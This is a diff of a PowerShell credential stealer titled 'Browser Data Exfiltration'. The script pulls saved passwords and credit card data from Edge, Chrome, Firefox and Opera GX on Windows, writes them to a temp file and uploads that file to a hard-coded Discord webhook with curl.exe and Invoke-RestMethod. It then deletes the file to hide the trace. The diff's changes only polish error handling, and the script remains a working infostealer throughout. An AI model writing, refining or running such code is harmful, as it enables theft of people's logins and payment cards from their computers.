@@ -1,6 +1,6 @@
 # Title: Browser Data Exfiltration with Remote Script Execution
 # Author: Jakoby
-# Description: This script extracts saved usernames/passwords and credit card information from Chrome, Firefox, and Opera GX on Windows 10/11 targets.
+# Description: This script extracts saved usernames/passwords and credit card information from Chrome, Edge, Firefox, and Opera GX on Windows 10/11 targets.
 
 # Target OS: Windows 10, 11
 
@@ -18,11 +18,11 @@ function Get-BrowserData {
         'edge'    { if ($DataType -eq 'passwords') { "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Login Data" } elseif ($DataType -eq 'creditcards') { "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Web Data" } }
         'firefox' { if ($DataType -eq 'passwords') { "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\logins.json" } }
         'opera'   { if ($DataType -eq 'passwords') { "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Login Data" } elseif ($DataType -eq 'creditcards') { "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Web Data" } }
-        default { Write-Host 'Unsupported browser or data type specified'; return }
+        default { Write-Error "Unsupported browser or data type specified"; return }
     }
 
     if (-not (Test-Path $Path)) {
-        Write-Host "The path for $Browser $DataType could not be found."
+        Write-Warning "The path for $Browser $DataType could not be found."
         return
     }
 
@@ -34,7 +34,7 @@ function Get-BrowserData {
                 $passwordData = & $sqliteCommand $Path $query
                 Write-Output "[$Browser Passwords]: $passwordData"
             } else {
-                Write-Host 'sqlite3.exe not found. Unable to extract passwords.'
+                Write-Warning 'sqlite3.exe not found. Unable to extract passwords.'
             }
         } elseif ($DataType -eq 'passwords' -and $Browser -eq 'firefox') {
             $firefoxData = Get-Content -Path $Path | ConvertFrom-Json
@@ -46,13 +46,13 @@ function Get-BrowserData {
                 $creditCardData = & $sqliteCommand $Path $query
                 Write-Output "[$Browser Credit Cards]: $creditCardData"
             } else {
-                Write-Host 'sqlite3.exe not found. Unable to extract credit card information.'
+                Write-Warning 'sqlite3.exe not found. Unable to extract credit card information.'
             }
         } else {
-            Write-Host "Unsupported data type for $Browser"
+            Write-Warning "Unsupported data type for $Browser"
         }
     } catch {
-        Write-Host "Failed to extract $DataType from $Browser"
+        Write-Error "Failed to extract $DataType from $Browser: $_"
     }
 }
 
@@ -61,19 +61,23 @@ $dc = 'https://discord.com/api/webhooks/1225028544258641981/kmftS6B2qpwjcNBn3ovP
 
 # Check if Discord webhook is set
 if ([string]::IsNullOrEmpty($dc)) {
-    Write-Host 'No exfiltration method set. Exiting.'
+    Write-Error 'No exfiltration method set. Exiting.'
     exit
 }
 
 # Collect browser data
-$outputFile = "$env:TMP\--BrowserData.txt"
-Get-BrowserData -Browser "edge" -DataType "passwords" >> $outputFile
-Get-BrowserData -Browser "edge" -DataType "creditcards" >> $outputFile
-Get-BrowserData -Browser "chrome" -DataType "passwords" >> $outputFile
-Get-BrowserData -Browser "chrome" -DataType "creditcards" >> $outputFile
-Get-BrowserData -Browser "firefox" -DataType "passwords" >> $outputFile
-Get-BrowserData -Browser "opera" -DataType "passwords" >> $outputFile
-Get-BrowserData -Browser "opera" -DataType "creditcards" >> $outputFile
+$outputFile = "$env:TMP\BrowserData.txt"
+try {
+    Get-BrowserData -Browser "edge" -DataType "passwords" >> $outputFile
+    Get-BrowserData -Browser "edge" -DataType "creditcards" >> $outputFile
+    Get-BrowserData -Browser "chrome" -DataType "passwords" >> $outputFile
+    Get-BrowserData -Browser "chrome" -DataType "creditcards" >> $outputFile
+    Get-BrowserData -Browser "firefox" -DataType "passwords" >> $outputFile
+    Get-BrowserData -Browser "opera" -DataType "passwords" >> $outputFile
+    Get-BrowserData -Browser "opera" -DataType "creditcards" >> $outputFile
+} catch {
+    Write-Error "Failed to collect browser data: $_"
+}
 
 # Send completion notification to Discord
 try {
@@ -81,8 +85,12 @@ try {
     Invoke-RestMethod -Uri $dc -Method Post -Body $body -ContentType 'application/json' -UseBasicParsing
     curl.exe -F "file1=@$outputFile" $dc
 } catch {
-    Write-Host 'Failed to send notification to Discord webhook.'
+    Write-Error "Failed to send notification to Discord webhook: $_"
 }
 
 # Clean up
-Remove-Item -Path $outputFile -Force -ErrorAction SilentlyContinue
+try {
+    Remove-Item -Path $outputFile -Force -ErrorAction SilentlyContinue
+} catch {
+    Write-Warning "Failed to clean up the output file: $_"
+}
